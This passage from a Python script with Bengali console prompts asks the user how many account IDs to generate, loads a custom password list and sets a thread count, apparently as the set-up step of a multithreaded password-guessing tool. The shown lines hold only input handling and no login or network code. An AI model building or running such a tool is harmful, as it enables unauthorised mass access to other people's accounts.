            console.print(f"\n[bold cyan]═══ দ্বিতীয় ধাপ: সংখ্যা নির্বাচন ═══[/bold cyan]")
            console.print("[dim]উপলব্ধ সংখ্যা: 100, 500, 1000, 2000, 5000, 10000, 50000, 99999[/dim]")
            try:
                quantity = int(console.input("[yellow]কত পিস আইডি দরকার? (100-99999): [/yellow]"))
                if quantity < 1 or quantity > 99999:
                    console.print("[red][!] 1 থেকে 99999 এর মধ্যে দিন[/red]")
                    continue
            except ValueError:
                console.print("[red][!] সঠিক সংখ্যা দিন[/red]")
                continue
            
            passwords = custom_password_list()
            
            try:
                threads = int(console.input("[yellow]থ্রেড সংখ্যা (10-50, ডিফল্ট 20): [/yellow]") or "20")
                if threads < 1 or threads > 100:
                    threads = 20
